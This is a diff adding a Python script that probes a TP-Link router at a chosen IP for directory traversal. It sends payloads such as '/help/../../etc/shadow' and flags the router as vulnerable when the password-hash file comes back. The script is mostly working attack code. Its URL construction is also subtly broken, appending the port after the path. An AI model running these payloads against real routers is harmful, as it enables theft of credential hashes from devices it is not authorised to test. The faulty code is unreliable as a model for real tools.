@@ -1,0 +1,47 @@
+#!/usr/bin/python3
+
+
+############### DESCRIPTION #######################################
+# Script to test if tplink router is directory traversal vulnerable
+# Inspired by the classic http-tplink-dir-traverse.nse in nmap
+#
+#
+#
+# Faquir Foysol   Date: April 5, 2020 Sunday 8:00pm
+###################################################################
+
+# Code starts from here 
+import requests 
+import argparse 
+payloads = ["/help/%20../%20../etc/shadow", "/images/top1_2.jpg", 
+            "/help/StatusHelpRpm.htm", "/userRpm/StatusRpm.htm", "../../../",
+            "/help/../../etc/shadow"
+           ]
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-t", type=str, help="target ip",default="192.168.0.1")
+parser.add_argument("-p", type=str, help="target port", default="80")
+args = parser.parse_args()        
+
+ip = args.t
+port = args.p
+
+for payload in payloads:
+    url = 'http://' + ip + payload + ':' + port #make the payload 
+    try:
+        resp = requests.get(url)
+        if "no authority" in resp.text:
+            print("[-]%s  Not vulnerable." %payload)
+            #print(resp.text)
+
+        if "root:" in resp.text:
+            print("[+] %s vulnerable." %payload)
+            #print(resp.text)
+        else:
+            print(resp.status_code)
+
+        resp.close() #finally close the connection        
+
+    except Exception as err:
+        print(err)
+
